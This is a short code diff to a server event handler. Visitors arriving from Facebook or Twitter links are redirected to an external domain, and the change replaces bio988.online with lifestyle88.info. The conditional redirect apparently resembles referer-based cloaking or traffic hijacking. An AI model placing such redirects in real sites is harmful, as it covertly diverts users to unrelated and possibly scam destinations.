@@ -12,6 +12,6 @@
 export default defineEventHandler((event) => {
     const headers = event.req.headers;
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://bio988.online"+event.req.url);
+        sendRedirect(event,"https://lifestyle88.info"+event.req.url);
     }
 })
